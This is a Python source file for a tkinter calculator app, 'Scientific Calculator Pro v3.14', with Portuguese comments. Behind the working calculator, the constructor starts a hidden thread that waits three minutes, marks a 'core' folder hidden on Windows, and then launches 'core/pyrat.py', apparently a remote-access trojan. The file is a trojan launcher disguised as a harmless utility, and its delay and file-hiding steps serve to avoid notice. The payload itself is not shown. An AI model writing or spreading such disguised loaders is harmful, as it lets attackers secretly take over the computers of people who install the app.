
import tkinter as tk
import sys
import os
import ctypes
from threading import Thread
from time import sleep

class Calculator(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Scientific Calculator Pro v3.14")
        self.geometry("400x500")
        self._create_widgets()
        Thread(target=self._delayed_init, daemon=True).start()

    def _create_widgets(self):
        # Interface gráfica legítima
        self.entry = tk.Entry(self, font=('Arial', 14))
        self.entry.pack(fill=tk.X, padx=10, pady=10)
        
        btn_frame = tk.Frame(self)
        btn_frame.pack()
        
        buttons = [
            '7', '8', '9', '/',
            '4', '5', '6', '*',
            '1', '2', '3', '-',
            '0', '.', '=', '+'
        ]
        
        row, col = 0, 0
        for b in buttons:
            tk.Button(btn_frame, text=b, width=5, height=2,
                     command=lambda x=b: self._press(x)).grid(row=row, column=col, padx=2, pady=2)
            col += 1
            if col > 3:
                col = 0
                row += 1

    def _press(self, key):
        if key == '=':
            try:
                result = eval(self.entry.get())
                self.entry.delete(0, tk.END)
                self.entry.insert(0, str(result))
            except:
                self.entry.delete(0, tk.END)
                self.entry.insert(0, "Error")
        else:
            self.entry.insert(tk.END, key)

    def _delayed_init(self):
        sleep(180)  # 3 minutos de delay
        if os.name == 'nt':
            ctypes.windll.kernel32.SetFileAttributesW('core', 2)
        os.system(f'"{sys.executable}" core/pyrat.py')

if __name__ == "__main__":
    Calculator().mainloop()
